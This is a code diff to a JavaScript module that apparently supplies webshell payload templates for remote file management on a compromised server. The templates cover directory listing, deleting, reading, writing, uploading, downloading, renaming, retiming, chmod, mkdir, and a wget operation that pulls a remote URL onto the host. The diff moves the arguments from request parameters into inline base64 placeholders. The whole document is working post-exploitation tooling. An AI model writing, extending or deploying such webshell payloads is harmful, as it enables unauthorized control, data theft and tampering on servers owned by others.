@@ -31,10 +31,9 @@ module.exports = (arg1, arg2, arg3) => ({
       s += sF;
       return s;
   }
-  var dirPath=decode(request.getParameter("${arg1}"));
+  var dirPath=decode("#{newbase64::path}");
   output.append(FileTreeCode(dirPath));
   `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
   },
 
   delete: {
@@ -53,10 +52,9 @@ module.exports = (arg1, arg2, arg3) => ({
       return "1";
     }
     
-    var fileOrDirPath = decode(request.getParameter("${arg1}"));
+    var fileOrDirPath = decode("#{newbase64::path}");
     output.append(DeleteFileOrDirCode(fileOrDirPath));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
   },
 
   create_file: {
@@ -87,13 +85,11 @@ module.exports = (arg1, arg2, arg3) => ({
       return sb.toString();
     }
     
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
+    var z1 = decode("#{newbase64::path}");
+    var z2 = decode("#{newbase64::content}");
     
     output.append(WriteFileCode(z1, z2));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
-    [arg2]: "#{newbase64::content}",
   },
 
   read_file: {
@@ -111,10 +107,9 @@ module.exports = (arg1, arg2, arg3) => ({
       return s;
     }
     
-    var z1 = decode(request.getParameter("${arg1}"));
+    var z1 = decode("#{newbase64::path}");
     output.append(ReadFileCode(z1));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
   },
 
   copy: {
@@ -146,12 +141,10 @@ module.exports = (arg1, arg2, arg3) => ({
       return "1";
     }
     
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
+    var z1 = decode("#{newbase64::path}");
+    var z2 = decode("#{newbase64::target}");
     output.append(CopyFileOrDirCode(z1, z2));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
-    [arg2]: "#{newbase64::target}",
   },
 
   download_file: {
@@ -169,10 +162,9 @@ module.exports = (arg1, arg2, arg3) => ({
       os.close();
       is.close();
     }
-    var z1 = decode(request.getParameter("${arg1}"));
+    var z1 = decode("#{newbase64::path}");
     output.append(DownloadFileCode(z1, response));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
   },
 
   upload_file: {
@@ -191,12 +183,10 @@ module.exports = (arg1, arg2, arg3) => ({
       os.close();
       return "1";
     }
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
+    var z1 = decode("#{newbase64::path}");
+    var z2 = decode("#{buffer::content}");
     output.append(UploadFileCode(z1, z2));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
-    [arg2]: "#{buffer::content}",
   },
 
   rename: {
@@ -207,12 +197,10 @@ module.exports = (arg1, arg2, arg3) => ({
       sf.renameTo(df);
       return "1";
     }
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
+    var z1 = decode("#{newbase64::path}");
+    var z2 = decode("#{newbase64::name}");
     output.append(RenameFileOrDirCode(z1, z2));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
-    [arg2]: "#{newbase64::name}",
   },
 
   retime: {
@@ -224,12 +212,10 @@ module.exports = (arg1, arg2, arg3) => ({
       f.setLastModified(dt.getTime());
       return "1";
     }
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
+    var z1 = decode("#{newbase64::path}");
+    var z2 = decode("#{newbase64::time}");
     output.append(ModifyFileOrDirTimeCode(z1, z2));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
-    [arg2]: "#{newbase64::time}",
   },
 
   chmod: {
@@ -271,11 +257,9 @@ module.exports = (arg1, arg2, arg3) => ({
       }
       return "1";
     }
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));    
+    var z1 = decode("#{newbase64::path}");
+    var z2 = decode("#{newbase64::mode}");    
     output.append(ChmodCode(z1, z2));`.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
-    [arg2]: "#{newbase64::mode}",
   },
 
   mkdir: {
@@ -285,10 +269,9 @@ module.exports = (arg1, arg2, arg3) => ({
       f.mkdir();
       return "1";
     }
-    var z1 = decode(request.getParameter("${arg1}"));
+    var z1 = decode("#{newbase64::path}");
     output.append(CreateDirCode(z1));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::path}",
   },
 
   wget: {
@@ -308,11 +291,9 @@ module.exports = (arg1, arg2, arg3) => ({
       h.disconnect();
       return "1";
     }
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
+    var z1 = decode("#{newbase64::url}");
+    var z2 = decode("#{newbase64::path}");
     output.append(WgetCode(z1, z2));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::url}",
-    [arg2]: "#{newbase64::path}",
   },
 });
